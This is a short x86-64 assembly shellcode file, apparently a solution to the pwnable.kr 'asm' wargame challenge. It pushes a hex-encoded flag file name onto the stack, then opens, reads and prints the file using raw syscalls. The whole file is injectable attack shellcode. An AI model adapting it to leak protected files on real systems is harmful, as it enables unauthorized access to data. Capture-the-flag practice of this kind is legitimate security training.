BITS 64

; open file
xor eax, eax
mov al, 2
mov rbx, 0x00676e6f306f306f
push rbx
mov rbx, 0x306f306f306f306f
push rbx
mov rbx, 0x3030303030303030
push rbx
mov rbx, 0x303030306f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f3030303030
push rbx
mov rbx, 0x3030303030303030
push rbx
mov rbx, 0x3030303030303030
push rbx
mov rbx, 0x303030306f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6f6f6f6f6f6f6f6f
push rbx
mov rbx, 0x6c5f797265765f73
push rbx
mov rbx, 0x695f656d616e5f65
push rbx
mov rbx, 0x6c69665f6568745f
push rbx
mov rbx, 0x7972726f732e656c
push rbx
mov rbx, 0x69665f736968745f
push rbx
mov rbx, 0x646165725f657361
push rbx
mov rbx, 0x656c705f656c6966
push rbx
mov rbx, 0x5f67616c665f726b
push rbx
mov rbx, 0x2e656c62616e7770
push rbx
mov rbx, 0x5f73695f73696874
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

; read file
mov rdi, rax ; set the fd value to rdi
xor rax, rax ; the call value is 0
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
mov rsi, rsp
mov rdx, 48
syscall

; write output
mov rax, 1
mov rdi, rax
mov rdx, 40
syscall

; write new line
mov rax, 1
mov rdi, rax
mov rdx, 1
push 0x0000000a
mov rsi, rsp
syscall

; exit(0)
xor rdi, rdi
xor rax, rax
mov al, 60
syscall
